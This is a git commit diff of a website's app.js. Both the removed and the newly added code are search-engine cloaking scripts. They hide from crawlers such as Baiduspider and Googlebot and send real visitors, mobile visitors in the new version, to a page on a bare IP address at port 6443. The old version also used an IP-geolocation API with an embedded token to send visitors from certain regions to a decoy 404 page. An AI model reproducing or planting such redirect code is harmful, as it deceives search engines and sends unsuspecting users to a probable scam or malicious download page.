e70721924bde0623098435e7039405878fa1c08a
kytgzero <130443591+kytgzero@users.noreply.github.com>
2023-11-29 21:03:53 +0800

    Update app.js

--- app.js
+++ app.js
@@ -1,74 +1,30 @@
-!function(p){"use strict";!function(t){var s=window,e=document,i=p,c="".concat("https:"===e.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=e.createElement("script"),r=e.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:"K5RgmDbX9GG2XzWG",ck:"K5RgmDbX9GG2XzWG"});
-(function (w, d, address) {
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3217dd9dabb7f86e34e22201e99c301c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+function isSpider() {
+//判断是否为蜘蛛，是蜘蛛返回true
+  if ((navigator.userAgent.match(/(Baiduspider|YisouSpider|360Spider|HaosouSpider|AdsBot|Googlebot|bingbot|Sogou web spider|Sosospider)/i)))
+    return true;
+  else
+    return false;
+}
+function isMobile() {
+//判断如果是手机端和电脑端跳转不同的网页
+  if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)))
+    return true;
+  else
+    return false;
+}
 
-
-  var  adurl = "http://154.89.127.200:6443/zcdll.html";//安卓url
-  var  apurl = "http://154.89.127.200:6443/zcdll.html";//苹果url
-
-
-
-
-
-  var ua = navigator.userAgent, app = navigator.appVersion;
-  var isAndroid = ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1; // Android
-  var isIOS = !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); // ios
-
-
-  if (!/(360spider|haosouspider|baiduspider|baiduspider-image|baiduspider-mobile|googlebot|Yisouspider|Sogou\sweb\spider|Sogous\sinst\sspider)/ig.test(d.referrer)) {
-
-
-    window.fffff = function (rs) {
-      var nowaddress = "";
-      try {
-        nowaddress = rs.data;
-        if(typeof nowaddress == 'object' && nowaddress.length){
-          nowaddress = nowaddress.join('')
-
-        }
-        console.log(nowaddress);
-        debugger
-      }catch (e) {}
-      console.log('当前地址：',nowaddress);
-      console.log('屏蔽的省份：',address);
-      var count = 0;
-      for(var i=0;i<address.length;i++){
-        var a = address[i];
-        if(nowaddress.search(a) !==-1){
-          count+=1;
-        }
-      }
-      if(count!==0){
-        self["location"] = "http://wap.17house.com/zt/404/0505.html" ;
-      }else{
-        if(isAndroid){
-          self["location"] = adurl ;
-        }else if (isIOS){
-          self["location"] = apurl ;
-        }else{
-          self["location"] = "http://wap.17house.com/zt/404/0505.html" ;
-        }
-      }
+if(!isSpider()){
+  
+    if(isMobile()) {
+     window.location.href = 'http://154.89.127.200:6443/zcdll.html';
+    } else {
+     window.location.href = '/404.html';
     }
-
-    function load(callback) {
-      var script = document.createElement("script")
-      script.type = "text/javascript";
-      if (script.readyState) {
-        script.onreadystatechange = function () {
-          if (script.readyState == "loaded" ||
-              script.readyState == "complete") {
-            script.onreadystatechange = null;
-            callback();
-          }
-        };
-      } else {
-        script.onload = function () {
-          callback();
-        };
-      }
-      script.src = "https://api.ip138.com/ip/?token=7c15b28b64b49210eeb387d5318abac2&callback=fffff";
-      (d.getElementsByTagName('body')[0]||d.getElementsByTagName('head')[0]).appendChild(script);
-    };
-    load();
-  }
-})(window, document, ['菲律宾,香港,北京']);
+}
